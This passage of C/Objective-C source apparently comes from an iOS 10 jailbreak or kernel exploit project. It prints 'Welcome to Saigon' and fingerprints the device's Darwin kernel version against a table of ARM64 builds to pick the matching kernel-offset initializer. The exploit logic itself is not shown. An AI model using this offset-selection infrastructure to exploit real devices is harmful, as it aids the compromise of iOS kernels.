    printf("[INFO]: sysname: %s\n", u.sysname);
    printf("[INFO]: nodename: %s\n", u.nodename);
    printf("[INFO]: release: %s\n", u.release);
    printf("[INFO]: kernel version: %s\n", u.version);
    printf("[INFO]: machine: %s\n", u.machine);
    
    init_default();
    
    if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Thu Dec 15 22:41:46 PST 2016; root:xnu-3789.42.2~1/RELEASE_ARM64_T8010") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_T8010\n");
        *func = (init_func)init_RELEASE_ARM64_T8010_1630_37894221;
        ret = KERN_SUCCESS;
    }
    else if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:54 PST 2017; root:xnu-3789.52.2~7/RELEASE_ARM64_S5L8960X") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_S5L8960X\n");
        *func = (init_func)init_RELEASE_ARM64_S5L8960X_1650_37895227;
        ret = KERN_SUCCESS;
    }
    else if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:55 PST 2017; root:xnu-3789.52.2~7/RELEASE_ARM64_T8010") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_T8010\n");
        *func = (init_func)init_RELEASE_ARM64_T8010_1650_37895227;
        ret = KERN_SUCCESS;
    }
    else if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:55 PST 2017; root:xnu-3789.52.2~7/RELEASE_ARM64_T7001") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_T7001\n");
        *func = (init_func)init_RELEASE_ARM64_T7001_1650_37895227;
        ret = KERN_SUCCESS;
    }
    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Tue Nov 29 21:40:09 PST 2016; root:xnu-3789.32.1~4/RELEASE_ARM64_T7001") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_T7001\n");
        *func = (init_func)init_RELEASE_ARM64_T7001_1630_37893214;
        ret = KERN_SUCCESS;
    }
    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Tue Nov 29 21:40:09 PST 2016; root:xnu-3789.32.1~4/RELEASE_ARM64_S8000") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_S8000\n");
        *func = (init_func)init_RELEASE_ARM64_S8000_1630_37893214;
        ret = KERN_SUCCESS;
    }
    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Thu Dec 15 22:41:46 PST 2016; root:xnu-3789.42.2~1/RELEASE_ARM64_T7000") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_T7000\n");
        *func = (init_func)init_RELEASE_ARM64_T7000_1630_37894221;
        ret = KERN_SUCCESS;
    }
    // iPad Air
    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Tue Nov 29 21:40:09 PST 2016; root:xnu-3789.32.1~4/RELEASE_ARM64_S5L8960X") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_S5L8960X\n");
        *func = (init_func)init_RELEASE_ARM64_S5L8960X_1630_37893214;
        ret = KERN_SUCCESS;
    }
    else if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:54 PST 2017; root:xnu-3789.52.2~7/RELEASE_ARM64_T7000") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_T7000\n");
        *func = (init_func)init_RELEASE_ARM64_T7000_1650_37895227;
        ret = KERN_SUCCESS;
    }
    else if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:54 PST 2017; root:xnu-3789.52.2~7/RELEASE_ARM64_S8000") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_S8000\n");
        *func = (init_func)init_RELEASE_ARM64_S8000_1650_37895227;
        ret = KERN_SUCCESS;
    }
    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Thu Dec 15 22:41:46 PST 2016; root:xnu-3789.42.2~1/RELEASE_ARM64_T7001") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_T7001\n");
        *func = (init_func)init_RELEASE_ARM64_T7001_1630_37894221;
        ret = KERN_SUCCESS;
    }
    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Thu Dec 15 22:41:46 PST 2016; root:xnu-3789.42.2~1/RELEASE_ARM64_S5L8960X") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_S5L8960X\n");
        *func = (init_func)init_RELEASE_ARM64_S5L8960X_1630_37894221;
        ret = KERN_SUCCESS;
    }
    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Tue Nov 29 21:40:08 PST 2016; root:xnu-3789.32.1~4/RELEASE_ARM64_T8010") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_T8010\n");
        *func = (init_func)init_RELEASE_ARM64_T8010_1630_37893214;
        ret = KERN_SUCCESS;
    }
    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Tue Nov 29 21:40:08 PST 2016; root:xnu-3789.32.1~4/RELEASE_ARM64_T7000") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_T7000\n");
        *func = (init_func)init_RELEASE_ARM64_T7000_1630_37893214;
        ret = KERN_SUCCESS;
    }
    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Thu Dec 15 22:41:45 PST 2016; root:xnu-3789.42.2~1/RELEASE_ARM64_S8000") == 0) {
        printf("[INFO]: Detected RELEASE_ARM64_S8000\n");
        *func = (init_func)init_RELEASE_ARM64_S8000_1630_37894221;
        ret = KERN_SUCCESS;
    }
    else {
        printf("[ERROR]:Unsupported device. quitting.\n");
        goto cleanup;
        
    }
    
cleanup:
    return ret;
}



/*
 * Function name: 	offsets_get_init_func
 * Description:		Determines which initialization function should be used for the current build.
 * Returns:			kern_return_t and function pointer in output params.
 */

static
kern_return_t offsets_get_init_func(init_func * func) {
    
    kern_return_t ret = KERN_SUCCESS;
    
    char machine[0x100] = {0};
    char build[0x100] = {0};
    
    ret = offsets_get_device_type_and_version(machine, build);
    if (KERN_SUCCESS != ret)
    {
        printf("[ERROR]: getting device type and build version");
        goto cleanup;
    }
    
    printf("[*] Welcome to Saigon\n");
    printf("[INFO]: machine: %s\n", machine);
    printf("[INFO]: build: %s\n", build);
    
    
    NSString *version = [[UIDevice currentDevice] systemVersion];
    printf("[INFO]: version: %s\n", [version UTF8String]);
    
    ret = offsets_determine_initializer_for_device_and_build(machine, build, func);
    if (KERN_SUCCESS != ret)
    {
        printf("[ERROR]: finding the appropriate function loader for the specific host\n");
        goto cleanup;
    }
    
    
cleanup:
    return ret;
}


/*
 * Function name: 	offsets_init
 * Description:		Initializes offsets for the current build running.
 * Returns:			int - zero for success, otherwise non-zero.
 */

int offsets_init() {
    
    init_func func = NULL;
    
    memset(&g_offsets, 0, sizeof(g_offsets));
    
    if (offsets_get_init_func(&func) != KERN_SUCCESS) {

        printf("[ERROR]: initializing offsets. No exploit for you!\n");
        return 1; // Fail
    }
    
    func();
    return 0;
}
